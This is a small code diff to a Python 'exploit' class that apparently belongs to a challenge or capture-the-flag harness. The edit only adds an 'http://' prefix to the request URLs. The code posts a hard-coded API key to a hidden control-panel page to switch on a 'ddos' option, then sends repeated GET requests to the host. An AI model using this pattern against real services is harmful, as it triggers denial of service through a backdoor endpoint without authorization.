@@ -15,9 +15,9 @@ class exploit(object):
 
 
     def exploit(self):
-        requests.post(self.HOST+"/controlpanel_68696464656e.php", data={"API":"8a77463e-149e-4443-a7f7-9e40cb0f0e11","ddos":"on"})
+        requests.post(f"http://{self.HOST}/controlpanel_68696464656e.php", data={"API":"8a77463e-149e-4443-a7f7-9e40cb0f0e11","ddos":"on"})
         for i in range(10):
-            requests.get(self.HOST)
+            requests.get(f"http://{self.HOST}")
 
 
     def _validate(self):
